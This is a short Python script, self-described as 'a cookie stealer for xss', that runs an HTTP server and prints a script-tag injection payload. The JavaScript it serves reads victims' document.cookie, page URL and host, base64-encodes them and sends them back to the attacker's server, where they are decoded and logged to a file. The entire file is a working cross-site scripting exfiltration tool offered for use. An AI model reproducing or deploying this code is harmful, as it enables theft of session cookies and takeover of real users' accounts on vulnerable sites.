import argparse
import http.server
import urllib.parse
import base64
parser = argparse.ArgumentParser(description="a cookie stealer for xss")
parser.add_argument("-p", "--port", dest="port", help="change port on your cookie stealer run")
parser.add_argument("-o", "--output", dest="file", help="export output as file")

args = parser.parse_args()

if args.port:
    print("youre payload is <script src='http://192.168.254.116:"+args.port+"/query=cookie'>");            
    class MyHandler(http.server.BaseHTTPRequestHandler):
        def log_message(self, format, *args):
            pass

        def do_GET(self):
            query_components = urllib.parse.parse_qs(urllib.parse.urlparse(self.path).query)
            query = query_components.get('query', [''])[0]
            data  = query_components.get('data', [''])[0]
            if len(data) > 0:
                print(base64.b64decode(data).decode('utf-8'))
                if args.file:
                  file = open(args.file+".txt","a");
                  file.write(base64.b64decode(data).decode('utf-8'))
                  file.close()
              

            if query == "cookie":
                self.send_response(200)
                self.send_header('Content-type', 'application/javascript')
                self.end_headers()

                js_code = """
                var data = {
                    cookie: document.cookie,
                    url: window.location.href,
                    web_host: window.location.hostname,
                    path: window.location.pathname
                };
                const xhttp = new XMLHttpRequest();
                xhttp.open("GET",              'http://192.168.254.116:""" + args.port + """/?data=' + btoa(JSON.stringify(data))
);
xhttp.send();

                """
                self.wfile.write(js_code.encode('utf-8'))
    httpd = http.server.HTTPServer(('192.168.254.116', int(args.port)), MyHandler)
    httpd.serve_forever()
else:
    parser.print_help()
